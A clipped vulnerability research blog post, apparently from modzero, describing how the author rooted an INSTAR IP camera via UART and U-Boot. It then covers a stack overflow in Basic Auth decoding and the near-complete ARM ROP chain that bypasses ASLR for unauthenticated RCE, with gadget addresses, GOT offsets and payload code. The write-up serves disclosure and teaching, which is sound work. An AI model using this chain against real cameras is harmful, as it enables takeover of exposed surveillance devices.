---
title: No Leak, No Problem – Bypassing ASLR with a ROP Chain to Gain RCE
source: https://modzero.com/en/blog/no-leak-no-problem/
source_host: modzero.com
clip_date: 2026-10-16T10:25:10+08:00
trace_id: 2f506439-9c53-4039-aade-82cb2eaff63e
content_hash: ac6793054027e69757b75fb9222a778542a2dedf3670d4d82f1d9b9edff84dc5
status: synced
tags:
  - 漏洞分析
  - 硬件逆向
series: null
feed_source: modzero·漏洞研究
ai_summary: TL;DR：通过 UART 中断 U-Boot 启动拿到 root 并提取 INSTAR 摄像头固件，发现 Basic Auth 自定义 Base64 解码中的 516 字节栈溢出，用 ARM ROP 改写 GOT 实现无地址泄漏绕过 ASLR 的未认证 RCE。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3fb75244-d011-8158-889f-de5667019640
ioc:
  cves:
    - CVE-2025-8760
    - CVE-2025-8761
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：通过 UART 中断 U-Boot 启动拿到 root 并提取 INSTAR 摄像头固件，发现 Basic Auth 自定义 Base64 解码中的 516 字节栈溢出，用 ARM ROP 改写 GOT 实现无地址泄漏绕过 ASLR 的未认证 RCE。
> 
> - **目标与暴露面：** INSTAR IN-8401 2K+ IP 摄像头（共享 2K+/4K 系列固件），Shodan 上约 1.2 万台暴露在公网。
> - **取固件：** 文档提到 UART 可恢复固件；接 FTDI 后中断 U-Boot（非直接 root shell），改 `bootargs` 加 `init=/bin/sh` 再 `nvt_boot` 即得 root，随后 dump 整个文件系统。
> - **架构：** lighttpd 反代 `.cgi` 请求经 `/tmp/instt_fcgi.socket` 到 `fcgi_server`，再以 TLV 序列化经 `/tmp/insttv2_socket` 转发到 `ipc_server`（认证与核心逻辑在此），两者均可未认证触达。
> - **漏洞：** Basic Auth 处理链中自定义 Base64 解码把结果 `memcpy` 进 516 字节栈缓冲；超长 `-u 'AAAA…:B'` 使 PC 变为 0x41414140 崩溃。黑盒 fuzzing 难发现，因为响应同为 500 且 lighttpd 立即重启进程。
> - **利用链：** ARMHF 32 位、无 canary、NX 开、No PIE、Partial RELRO（GOT 可写）；libc 有 PIE 且 ASLR 开启，属一次性利用。读 `isalnum@got`，加偏移 `0x13230` 得 `system`，经 `str r0,[r4,#4]` 写回 GOT，再调 `isalnum@plt` 执行命令。作者放弃暴力猜 `system` 地址，因其噪音过大。

After my [previous post](https://modzero.com/en/blog/roping-our-way-to-rce/) on ARM exploitation, where we crafted an exploit for a known vulnerability, I decided to continue the research on a more modern IoT target. In this follow-up post, I will take you through building a considerably more complex binary exploit. We will explore the path from firmware extraction and analysis to the discovery of a previously unknown vulnerability and its exploitation. Follow along as we build an ARM ROP chain to bypass ASLR without an address leak, and achieve unauthenticated RCE.

## Target Overview

I examined the IN-8401 2K+, an IP camera from the German manufacturer INSTAR. It’s a modern networked surveillance camera that exposes a web-based user interface for configuration and live view. As I later found this particular model shares its firmware with other devices from INSTAR’s 2K+ and 4K series. According to Shodan [1](#fn:1) there are roughly 12,000 INSTAR devices visible on the public internet.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9405a52cd79aa05f.png)

INSTAR IN-8401 2K+ web interface

## Cracking the Shell Open

Before we can meaningfully hunt for vulnerabilities, we need to gain access to the device to obtain its firmware. Access to the firmware exposes binaries, configuration files, scripts and the filesystem layout and enables both static inspection and dynamic testing. Without the firmware we’re stuck with blind fuzzing of the network interface.

It’s always a good idea to collect as much information as possible before diving into analysis mode. So I started with some reading. INSTAR provides quite an extensive documentation about its cameras and their features. I found a very interesting page titled “Restore your HD Camera after a faulty Firmware upgrade” [2](#fn:2). The article explained that the camera exposes a UART interface and how it could be accessed to restore a firmware image. UART is a hardware interface used for serial communication commonly found on development boards, embedded systems, and debugging interfaces. In the documentation it looked like it’s possible to boot right into a root shell.

Although the article was written for the HD camera models, not my 2K+, I figured it might be worth a shot, since manufacturers often reuse features and components across different product versions. I removed the front part of the housing and spotted the debugging interface as shown on the wiki page.

I went ahead and attached some PCBites to the interface and connected them to a FTDI, which is a small USB-to-serial converter.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9b97fde799c05623.jpg)

Attaching FTDI to exposed UART interface

I then plugged the FTDI into my Linux machine and connected to it. After supplying some input over the serial connection I was greeted with a login prompt, cool!

```bash
INSTAR login: root
Password:
Login incorrect
```

I tried a couple of the usual combinations like admin:admin, root:root, and so on, but had no success. The documentation explained that the boot process could be interrupted to obtain a root shell on the device’s OS. So I rebooted the camera to see if that worked.

```bash
U-Boot 2019.04 (Oct 18 2023 - 11:38:25 +0000)

CPU:   Novatek NT @ 999 MHz
DRAM:  512 MiB
Relocation to 0x1ff3b000, Offset is 0x01f3b000 sp at 1fbf4dc0
nvt_shminfo_init:  The fdt buffer addr: 0x1fbfb8c8
ARM CA9 global timer had already been initiated
otp_init!
120MHz
otp_timing_reg= 0xff6050
 CONFIG_MEM_SIZE                =      0x20000000
 CONFIG_NVT_UIMAGE_SIZE         =      0x01900000
 CONFIG_NVT_ALL_IN_ONE_IMG_SIZE =      0x14a00000
 CONFIG_UBOOT_SDRAM_BASE        =      0x1e000000
 CONFIG_UBOOT_SDRAM_SIZE        =      0x01fc0000
 CONFIG_LINUX_SDRAM_BASE        =      0x01100000
 CONFIG_LINUX_SDRAM_SIZE        =      0x1cf00000
 CONFIG_LINUX_SDRAM_START       =      0x1c700000
[...]
phy interface: INTERNAL MII
eth_na51055
Hit any key to stop autoboot:  0
 do_nvt_boot_cmd: boot time: 1718855(us)
 [...]
```

As you can see there was indeed a mechanism to stop the device from autobooting. But contrary to what the documentation suggested, interrupting the boot process didn’t provide a root shell on the OS, only in the U-Boot bootloader. U-Boot (short for Universal Bootloader) is an open-source bootloader commonly used in embedded systems to initialize hardware and load the operating system or firmware during startup.

```bash
nvt@na51055: printenv
arch=arm
[...]
bootargs=console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0
nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rw
bootcmd=nvt_boot
[...]
vendor=novatek
ver=U-Boot 2019.04 (Oct 18 2023 - 11:38:25 +0000)
```

I noticed that the Kernel boot parameters were provided by an environment variable called `bootargs`. I went ahead an tried the `init=/bin/sh` trick which tells the Kernel to start a shell instead of the init process. I updated the variable accordingly and tried to boot using `nvt_boot`.

```bash
invt@na51055: setenv bootargs "console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0
nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rw init=/bin/sh"
nvt@na51055: nvt_boot
[...]
EXT4-fs (mmcblk2p1): recovery complete
EXT4-fs (mmcblk2p1): mounted filesystem with ordered data mode. Opts: (null)
VFS: Mounted root (ext4 filesystem) on device 179:1.
devtmpfs: mounted
Freeing unused kernel memory: 1024K
Run /bin/sh as init process
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
/ # hostname
INSTAR
```

It worked. I added a new root user and rebooted the device. Now I was able to login to the device using the newly created user. I dumped the whole filesystem for analysis and as a backup so I could also restore it later, if anything went wrong along the way.

## High-Level Architecture & Attack Surface

With the device unlocked and open for exploration it’s very easy to get swept away by curiosity. With the goal of finding exploitable vulnerabilities in mind it’s important to lay out something like an attack surface map first.

The web stack consisted of various components, most prominently a lighttpd web server that acted as an entry point and reverse proxy. I started by inspecting its configuration to see what it was doing. As you would expect from a reverse proxy, incoming requests were forwarded to the appropriate backend. For example, requests to files ending with `.cgi` were routed to the fcgi_server binary through a socket at `/tmp/instt_fcgi.socket`.

```bash
fastcgi.server = ( ".cgi" => ((
"bin-path" => "/home/ipc/bin/fcgi_server",
"socket" => "/tmp/instt_fcgi.socket",
"max-procs" => 1,
"check-local" => "disable"
))
```

I was mainly interested in finding code that was reachable without authentication. From my initial exploration I knew that there was an SQLite database file where the web interface users were stored, so the binary that performed authentication had to access this file. However, I couldn’t confirm that `fcgi_server` was interacting with it. I concluded another component must be involved. In the process list I noticed a process called `ipc_server`. I attached `strace` to see what it was doing and found that incoming requests for most endpoints were forwarded from `fcgi_server` to `ipc_server` via `/tmp/insttv2_socket`.

As an example:

```bash
$ curl '192.168.0.3/param.cgi?cmd=mod0&paramkey=paramvalue'
cmd="mod0";
response="204";
```

On ipc_server’s end:

```bash
recv(91, "\4cmd\0\3\5\0\0\0mod0\0\6param\0\4\32\0\0\0\tparamkey\0\3\v\0\0\0paramvalue\0\7header\0\4\25\0\0\0\3ip\0\3\f\0\0\000192.168.0.1\0", 87, 0) = 87
```

As you can observe, the HTTP request wasn’t forwarded as-is, it was first serialized using some type of Type–Length–Value (TLV) structure. These observations also made it clear that authentication and the core application logic reside in the `ipc_server` backend.

With this, I had identified two interesting targets: `fcgi_server` and `ipc_server`, both of which were reachable by an unauthenticated attacker.

## Methodology

With the two main targets `fcgi_server` and `ipc_server` identified we can now focus on searching for vulnerabilities. In this section I want to quickly touch on the methods I employed for doing so.

Probably one of the most important ingredients for efficient vulnerability hunting is having a proper debugging setup in place. This allows for quickly double-checking any assumptions made during static analysis, tracing calls, and so on. I ran more or less an identical setup to the one used in the last research with a gdb server on the IP camera and a gdb client on the attacker’s machine.

For this research I primarily used two approaches: fuzzing, and a combination of static and dynamic analysis. I started off with something that I would call a very primitive way of black-box fuzzing using boofuzz [3](#fn:3) on collected web endpoints. I tried fuzzing through all possible parameters I had found on various endpoints to see if I could trigger a crash. Although this approach yielded CVE-2025-8761 [4](#fn:4), I felt like it was very inefficient as a crash of the whole system was the only thing I was able to reliably detect (more on that later).

As a secondary approach I spent quite some time on reverse engineering the two binaries `fcgi_server` and `ipc_server`. I tried to get an understanding of how things work while focusing on the usual suspects for memory corruption like bounds checking, pointer arithmetic, etc. To speed things up my process usually involved examining the decompiled binary, making assumptions, and verifying them using `gdb` and `strace` dynamically.

## Vulnerability Hunting

Let’s have a look at some code. As described earlier `fcgi_server` acted as some sort of custom middleware that translated web requests into ipc messages. In the decompiled binary I found a dispatcher for `.cgi` endpoints which called certain handler functions based on the given URI.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5f650829d145b8c8.png)

Dispatcher function in decompiled fcgi_server binary

In most of the handler functions a similar pattern emerged. Inside each handler there was a call to the same function which looked like another dispatcher. I identified the second dispatcher as some sort of authentication handler.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/14843bc3beaa04a9.png)

Update handling function in decompiled fcgi_server binary

I assumed that the code had to extract and serialize the corresponding auth data from http requests differently, depending on the authentication mechanism used. There were several different handlers one of which I identified as the basic auth handler.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9a0e5e336ab717e3.png)

Auth handler function in decompiled fcgi_server binary

Inside the basic auth handler, there was a call to another function that looked like a custom implementation of Base64 decoding. As you might have noticed, the decompiled code contained typical C++ elements such as class methods, this pointers, and references to the C++ standard library. Most of the string-related functionality I had seen so far was therefore using C++’s standard string handling. In this case, however, I noticed a `memcpy` that copied the decoded Base64 result into a fixed-size buffer (516 bytes) located on the stack.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f177b41a6e94005.png)

Base64 decoding function in decompiled fcgi_server binary

Without spending much more time on static analysis, I moved on to perform some dynamic testing of the basic authentication functionality. First, I needed to verify my assumption that the basic auth handler and Base64 decode function were being triggered, so I set a few breakpoints and sent a request.

```bash
$ curl -k https://192.168.0.3/castore.cgi -u 'A:B' -v
[...]
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/2 500
< content-type: text/plain; charset=utf-8
[...]
< server: lighttpd/1.4.72
```

The breakpoints triggered which confirmed my assumptions so far and I got back a 500.

Then I sent another request with a very long basic auth string exceeding the 516 buffer length in the base64 decode function.

```bash
$ curl -k https://192.168.0.3/castore.cgi -u 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:B' -v
[...]
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/2 500
< content-type: text/html
[...]
< server: lighttpd/1.4.72
<
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>500 Internal Server Error</title>
 </head>
 <body>
  <h1>500 Internal Server Error</h1>
 </body>
</html>
```

I got back another 500. However, the response wasn’t the same, this time it included an HTML error message. Strange, right? Let’s have a look at what the serial terminal showed.

```bash
Hardware name: Novatek Video Platform
PC is at 0x41414140
LR is at 0x76e39e8c
pc : [<41414140>]    lr : [<76e39e8c>]    psr: 60010030
sp : 753808d0  ip : 76e6f48c  fp : 41414141
r10: 41414141  r9 : 41414141  r8 : 41414141
r7 : 41414141  r6 : 41414141  r5 : 41414141  r4 : 41414141
r3 : 00000000  r2 : 75380698  r1 : 00000000  r0 : 75380698
Flags: nZCv  IRQs on  FIQs on  Mode USER_32  ISA Thumb  Segment user
Control: 10c5387d  Table: 4dbdc04a  DAC: 00000055
CPU: 1 PID: 6392 Comm: fcgi_server Tainted: P           O      4.19.91 #1
Hardware name: Novatek Video Platform
Backtrace:
[<8010b428>] (dump_backtrace) from [<8010b554>] (show_stack+0x18/0x1c)
 r7:41414140 r6:60070013 r5:00000000 r4:808405e4
[...]
```

What happened? The program had crashed. `PC is at 0x41414140` indicates that I had overwritten the stack since the code took the return address from the stack and tried jumping to it. In this case `0x41414140` which corresponds to the payload sent. I had found a stack-based buffer overflow.

Why hadn’t I discovered this vulnerability during my initial fuzzing? I figured there were two reasons:

-   The HTTP status code was the same as for a normal request, only the response body differed. So getting a 500 response to the request was nothing unusual.
-   The lighttpd server immediately restarted `fcgi_server`, so the crash wasn’t noticeable from an outside perspective.

This once again highlights the importance of a proper debugging setup.

## Exploitation

Before we jump to the fun part, a quick heads up: If you’re not familiar with binary exploitation or the ARM architecture I’d recommend to have a look at the previous blog post [5](#fn:5) first as many concepts are similar to those from the previous research and won’t be described in detail in this post.

Let’s first discuss the preconditions of exploiting the discovered stack-based buffer overflow. We’re dealing with an ARMHF 32 bit binary, dynamically linked and stripped. As shown by `checksec` the target binary isn’t protected by stack canaries, but does have the NX mitigation enabled. It isn’t compiled as a position independent executable (PIE) and has partial relocation read-only (RELRO).

```bash
$ file fcgi_server
fcgi_server: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 4.9.0, stripped
```

```bash
$ checksec --file=fcgi_server
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

What does this mean for us as attackers? Overwriting return addresses on the stack with an overflow is straightforward because of the lack of stack canaries. However, we can’t execute shellcode on the stack. Also, the binary will always be placed in the same memory region, because it wasn’t compiled as a PIE. Finally, partial RELRO means that the global offset table (GOT) comes before the BSS section in memory, which holds uninitialized global and static variables. This eliminates the risk of a buffer overflow from a global variable overwriting GOT entries [6](#fn:6). Since our overflow is on the stack, this doesn’t really matter to us. What does matter though, is that it also means that the GOT is writable. Only full RELRO provides a read-only GOT.

Let’s also have a look at the libraries included by the target binary such as the libc. We can see that libc was compiled with PIE, meaning that it can be placed randomly in memory during runtime.

```bash
$ checksec --file=libc-2.29.so
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    DSO
```

Evidently, when looking at the mitigations in place, it makes sense to consider a Return-oriented programming (ROP) chain to achieve command execution. A ROP chain leverages small code snippets, or gadgets, already present in a program’s memory. By linking these gadgets, an attacker constructs an unintended, attacker-controlled execution flow. The effectiveness of a ROP chain depends on the availability of suitable gadgets and the attacker’s knowledge of their memory addresses.

In our case we could use gadgets from the target binary (`fcgi_server`) itself because their addresses are static and therefore known. These gadgets are quite limited though and eventually we would need to call file I/O functions or `system()` provided by libc to gain command execution. Note that libc was compiled with PIE. I quickly confirmed on the device that address space layout randomization (ASLR) was enabled, so libc was indeed placed at a random address in memory.

I came up with a couple of ideas on how to deal with this:

-   Find a libc address leak through another vulnerability
-   Find a file read for /proc/self/maps
-   Leak a libc address through a ROP chain

Unfortunately, I couldn’t quickly find another vulnerability that would let me leak a libc address. I considered reading `/proc/self/maps` to locate libc, but that proved unsuccessful. I also looked into using gadgets in the target binary to build a ROP chain to leak a libc address. However, there was no straightforward way to exfiltrate the leaked pointer.

A bigger issue was that any ROP chain would eventually crash the binary, rendering the leak useless because libc would be relocated on the next start of `fcgi_server`. In a stack-based buffer overflow, it’s also impossible to restore the stack to its previous state, as the very information required for restoration is overwritten.

One approach often used in this kind of scenario is to trigger the bug multiple times to prolong the crash: trigger it once to leak an address, then return to the vulnerable function and trigger the overflow again to make use of the leak. However, that approach requires an I/O channel to read the leak and then supply input again. Given the web-stack architecture we discussed and the bug’s location, that wasn’t feasible, so I concluded a one-shot exploit was likely the only viable option.

### The Plan

There are several known techniques that revolve around the GOT and Procedure Linkage Table (PLT) to bypass ASLR. When a call to an external function such as `puts` (libc) is made, the immediate call goes to `puts@plt` which acts as a resolver of the actual address of `puts` within libc. The resolved address is then stored in the GOT. If a specific function has already been resolved previously it is taken from the GOT by the `puts@plt` stub [7](#fn:7).

So the information needed to bypass ASLR lives in the GOT. Ideally we’d find the address of `system` there, but the target binary never references `system`, so it has no GOT/PLT entry. Instead, we could read a GOT entry for another function, compute the offset from that function to our target, and use that to redirect execution to the target. But all of this must be done via a ROP chain built from gadgets available in the binary.

The high level steps would look something like this:

-   Read a GOT entry and store in register x
-   Increment/decrement register x to reach target function (eg. addition, multiply, etc.)
-   Jump to x

Or another approach:

-   Increment/decrement value pointed to by GOT pointer to reach target function (GOT is writable)
-   Dereference GOT pointer into register x
-   Jump to x

Still a vast simplification, we would still need to move arguments into the correct registers and so on before jumping to the target function `system()` but it’s a starting point.

### Finding the Pieces

To pursue this idea I first wanted to find a GOT entry that is already populated when triggering the vulnerability. Within the vulnerable base64 decode function there is a call to `isalnum` which is a libc function. Let’s have a look at its PLT and GOT entries.

Using `objdump` we can see the address of the PLT entry inside `fcgi_server` of `isalnum`

```bash
objdump -d fcgi_server| grep '<isalnum@plt>'
000147e8 <isalnum@plt>:
   206c8:       ebffd046        bl      147e8 <isalnum@plt>
   21010:       ebffcdf4        bl      147e8 <isalnum@plt>
```

To verify the corresponding GOT entry and actual address at runtime I set a breakpoint at the return statement after the overflow.

```bash
(remote) gef➤  info address isalnum@got.plt
Symbol "isalnum@got.plt" is at 0x400c8 in a file compiled without debugging.
(remote) gef➤  x/wx 0x400c8
0x400c8 <isalnum@got.plt>:      0x76ba86f0
(remote) gef➤  x/8i 0x76ba86f0
   0x76ba86f0 <isalnum>:        ldr     r3, [pc, #24]   @ 0x76ba8710 <isalnum+32>
   0x76ba86f4 <isalnum+4>:      mrc     15, 0, r2, cr13, cr0, {3}
   0x76ba86f8 <isalnum+8>:      lsl     r0, r0, #1
   0x76ba86fc <isalnum+12>:     ldr     r3, [pc, r3]
   0x76ba8700 <isalnum+16>:     ldr     r3, [r2, r3]
   0x76ba8704 <isalnum+20>:     ldrh    r0, [r3, r0]
   0x76ba8708 <isalnum+24>:     and     r0, r0, #8
   0x76ba870c <isalnum+28>:     bx      lr
```

As you can see the GOT entry is at `0x400c8` which points to the actual address of `isalnum` at `0x76ba86f0` within libc.

```bash
(remote) gef➤  info function system
All functions matching regular expression "system":

Non-debugging symbols:
0x000147c4  std::_V2::system_category()@plt
[...]
0x76bbb920  __libc_system
0x76bbb920  system
0x76c83fac  svcerr_systemerr
```

Let’s see how far apart that `isalnum` (0x76ba86f0) and `system` (0x76bbb920) are.

```python
>>> hex(0x76bbb920 - 0x76ba86f0)
'0x13230'
```

So that means that if we can add 0x13230 to the address at `isalnum@got` we have the address of `system`.

### Gadgets, Gadgets and more Gadgets

Now to the tedious part. The only thing between the high-level plan and RCE was a bunch of gadgets, right? I initially tried tools such as `angrop` [8](#fn:8) to find and automatically chain gadgets, but ARM assembly offers many different, often multi-instruction ways to perform simple operations, e.g. add to a register or move values between registers. Those tools handle obvious, straightforward gadgets well, but they struggle once the gadget sequences become more complex. So in the end I reverted to manually searching and chaining gadgets with `Ropper` [9](#fn:9).

If no short, straightforward gadgets are available, you must resort to longer ones. Typically, the longer a gadget is, the more side effects it has, for example, overwriting registers or changing the stack pointer. The challenge is therefore to find gadgets that implement the required primitive while introducing only manageable side effects that later gadgets can correct.

The most crucial gadget in my chain was the one to add two values, preferably fully controllable. This would let me add the calculated offset to the address at `isalnum@got` to get the address of `system`. While there were a couple of gadgets to add static values like 0x1 or 0x2 to a register, these didn’t seem very useful because either a loop would be required to call them many times or the chain would become too long to reach the desired value. So I tried to find gadgets that added values from two registers such as the following one.

```
# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
```

Let’s break that down:

-   `add r6, fp, r6`: Adds fp (r11) and r6, stores result in r6
-   `ldrb sb, [ip, #1]`: Dereferences ip (r12) + 1 byte, stores result in sb (r9)
-   `ldr sl, [ip, #2]`: Dereferences ip (r12) + 2 word, stores result in sl (r10)
-   `blx r3`: Jumps to r3

As you can see here side effects can also mean that certain registers have to contain certain values beforehand. In this case ip (r12) has to contain a valid address that can be dereferenced. If that’s not the case, the program will crash.

So we have a gadget that allows us to add fp (r11) and r6. Ideally we want the address of `isalnum` in r6 and the offset we calculated earlier in fp (r11) giving us the address of `system` in r6 as an output of the gadget. But how do we get the address of `isalnum` into r6? The address of `isalnum@got` is known so we need a gadget to dereference it to obtain the address of `isalnum` within libc.

To accomplish this, let’s have a look at this gadget:

```
# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
```

Breakdown:

-   `ldr r6, [r3, #0x10]`: Dereferences (r3 + 0x10), stores result in r6
-   `ldr r3, [r2, #4]`: Dereferences (r2 + 0x4), stores result in r3
-   `blx r3;`: Jumps to r3

Exactly what we need, but as you can tell this gadget needs some specific preparation beforehand. To continue the chain with `blx r3` we need to make sure `*(r2 + 0x4)` results in the next gadget of the chain. But that should be doable.

Last but not least we need a gadget to jump to the calculated address. Unfortunately I simply couldn’t find one. I also couldn’t find ways of moving the address into another register for which call gadgets would exist. So where to go from here? I recalled that the GOT of the target binary is actually writable. So what about writing it back to the GOT? If that works we could just call `isalnum@plt` which would then load the altered address from the GOT and jump to it.

Let’s try, here’s another gadget:

```
# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
```

Breakdown:

-   `str r0, [r4, #4]`: Dereferences (r4 + 0x4) and stores value of r0
-   `pop {r4, r5, r6, pc}`: Continues the chain

This gadget enables us to store a value in r0 at `*(r4 + 0x4)`. Given that we find gadgets to move our calculated address into r0 and `isalnum@got - 0x4` into r4 this allows us to write the tampered address back to the GOT.

So if we could make everything line up the plan would be:

-   Dereference `isalnum@got` entry and store it in r6
-   Add the calculated offset to `system` to the register r6
-   Write the register r6 back to the GOT -> `isalnum@got`
-   Prepare function arguments for `system`
-   Call `isalnum@plt`

### Building the Chain

The path wasn’t as straightforward as this write-up might imply. I spent quite some time trying to mix and match gadgets and even exchanged the ones discussed above numerous times until I came up with the following chain. Let me walk you through it.

The function epilogue of the vulnerable base64 function conveniently allows us to populate r4 to r11 before jumping to the first gadget. So in this case I added some values to r6, r9 and r11 for later use.

```python
p = b""
p += 516 * b"A"
p += b"BBBB" # r4
p += b"CCCC" # r5
p += p32(0x1cad0) # r6
p += b"EEEE" # r7
p += b"FFFF" # r8
p += p32(0x190ac) # r9 (sb)
p += b"HHHH" # r10 (sl)
p += p32(0x13230) # r11 (fp) -> offset system - isalnum
```

As a first step of the chain, we do some preparations.

```python
# 0x00028a08: mov r0, r6; pop {r4, r5, r6, pc};
p += p32(0x28a08)
p += b"XXXX" # r4
p += b"XXXX" # r5
p += b"XXXX" # r6

# 0x0001459c: pop {r3, pc};
p += p32(0x1459c)
p += p32(ISALNUM_GOT - 0x10) # r3

# 0x0002a33c: mov r2, sp; str r0, [sp, #4]; mov r0, r3; blx sb;
p += p32(0x2a33c)
p += b"AAAA" # <- sp
```

What we do here is basically this:

```python
r0 = r6 = 0x1cad0
r3 = ISALNUM_GOT - 0x10
r2 = sp
*(sp + 4) = r0 = 0x1cad0
r0 = r3 = ISALNUM_GOT - 0x10
*(0x190ac)()
```

Note that we store `isalnum@got` in r3 so the following gadget can dereference it into r6. As discussed before we have to make sure that r2 contains a stack pointer so the chain can continue with `blx r3`.

```python
# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
```

```python
r6 = *(r3 + 0x10) = *(ISALNUM_GOT - 0x10 + 0x10) = *ISALNUM_GOT
r3 = *(r2 + 0x4) = *(sp + 0x4)
*(sp + 0x4)() # -> 0x1cad0
```

As shown above `*(sp + 0x4)` is overwritten at runtime, so we need to make sure there is some scratch space on the stack so everything adds up properly.

When jumping to the gadget at 0x1cad0 the stack looks like this:

| Address | Value |     |
| --- | --- | --- |
| 0x1000FFF8 | 0x1459c |     |
| 0x1000FFF4 | 0x1cad0 |     |
| 0x1000FFF0 | AAAA | <- stack pointer |

The stack pointer still points at the AAAA value. So we continue with some readjustments of the stack pointer and preparations of the r3 register.

```python
# 0x0001cad0: pop {r4, r5, pc};
p += b"XXXX" # r5 (scratch space)

# 0x0001459c: pop {r3, pc};
p += p32(0x1459c)
p += p32(0x27d14) # r3
```

```python
r3 = 0x27d14
```

Next up is the discussed gadget to add `isalnum` ’s address an the calculated offset. The offset was already put into fp (r11) at the very beginning of the chain. Register r6 also contains `isalnum` ’s real address read from the GOT by now.

```python
# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
p += p32(0x228d8)
```

```python
r6 = r6 + fp = *ISALNUM_GOT + 0x13230 = system
sb = *(ip + 0x1)
sl = *(ip + 0x2)
*(0x27d14)()
```

The ip register can be disregarded as it won’t be used later and conveniently contained an address that points to the stack. Since we’re just reading from it, it also doesn’t invoke any undesirable side effects.

```python
# 0x00027d14: mov r0, r6; add sp, sp, #0x3c; pop {r4, r5, r6, r7, r8, sb, sl, fp, pc};
p += 0x3c * b"P"
p += p32(ISALNUM_GOT - 4) # r4 -> target - 4
p += b"XXXX" # r5
p += b"XXXX" # r6
p += b"XXXX" # r7
p += b"XXXX" # r8
p += b"XXXX" # sb
p += b"XXXX" # sl
p += b"XXXX" # fp
```

As a next step we have a gadget that moves r6 into r0. So we move the calculated address (= `system`) into r0. Also, we prepare the r4 register for the next step. To deal with the side effects of this gadget some more padding is added.

```python
r0 = r6 = system
sp = sp + 0x3c
r4 = ISALNUM_GOT - 4
```

Finally, we reach the gadget that writes our calculated `system` address back to the GOT.

```python
# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
p += p32(0x2a3f8)
p += b"XXXX" # r4
p += b"XXXX" # r5
p += p32(ISALNUM_PLT) # r6
```

To our convenience it also allows us to write `isalnum@plt` to r6.

```python
*(r4 + 0x4) = r0 = *(ISALNUM_GOT - 0x4 + 0x4) = system
r6 = ISALNUM_PLT
```

From here there isn’t much left to do. We move the stack pointer into r0 (first argument) and then call r6 which we previously populated with the address of `system`.

```python
# 0x0001fb04: mov r0, sp; blx r6;
p += p32(0x1fb04)
p += CMD.encode()
p += b"\x00"
```

Let’s test things out:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5736f51d4e2db203.png)

Final exploit to gain a root shell on target device

RCE!

### Why Didn’t You Just …?

